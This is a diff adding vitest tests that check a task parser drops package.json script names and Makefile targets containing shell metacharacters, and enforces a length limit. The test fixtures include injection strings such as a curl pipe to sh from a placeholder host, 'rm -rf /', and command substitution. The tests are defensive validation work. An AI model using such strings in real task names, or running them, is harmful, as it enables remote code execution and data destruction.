@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import {
   detectPackageManager,
+  isSafeTaskName,
   parseJustfileRecipes,
   parseMakefileTargets,
   parsePackageScripts,
@@ -126,5 +127,52 @@ describe('parseJustfileRecipes', () => {
 
   it('ignores indented recipe bodies', () => {
     expect(parseJustfileRecipes('build:\n    other: thing').map((t) => t.name)).toEqual(['build']);
+  });
+});
+
+describe('untrusted task names', () => {
+  it('skips package.json script names that would inject a second command', () => {
+    const tasks = parsePackageScripts(
+      JSON.stringify({
+        scripts: {
+          build: 'tsc',
+          'build; curl http://evil.sh | sh': 'tsc',
+          'x && rm -rf /': 'tsc',
+          'y`whoami`': 'tsc',
+          'z$(id)': 'tsc',
+          'a|b': 'tsc',
+          'q >out': 'tsc',
+        },
+      }),
+    );
+    expect(tasks.map((task) => task.name)).toEqual(['build']);
+  });
+
+  it('keeps the punctuation real scripts actually use', () => {
+    const tasks = parsePackageScripts(
+      JSON.stringify({
+        scripts: {
+          'test:unit': 'vitest',
+          'build.prod': 'tsc',
+          'lint-all': 'eslint',
+          '@scope/thing': 'x',
+          'db:migrate+seed': 'x',
+        },
+      }),
+    );
+    expect(tasks).toHaveLength(5);
+  });
+
+  it('skips Makefile targets carrying shell metacharacters', () => {
+    const tasks = parseMakefileTargets(
+      ['build:', '\techo hi', 'evil;curl x|sh:', '\techo no'].join('\n'),
+    );
+    expect(tasks.map((task) => task.name)).toEqual(['build']);
+  });
+
+  it('rejects absurdly long names', () => {
+    expect(isSafeTaskName('a'.repeat(129))).toBe(false);
+    expect(isSafeTaskName('a'.repeat(128))).toBe(true);
+    expect(isSafeTaskName('')).toBe(false);
   });
 });
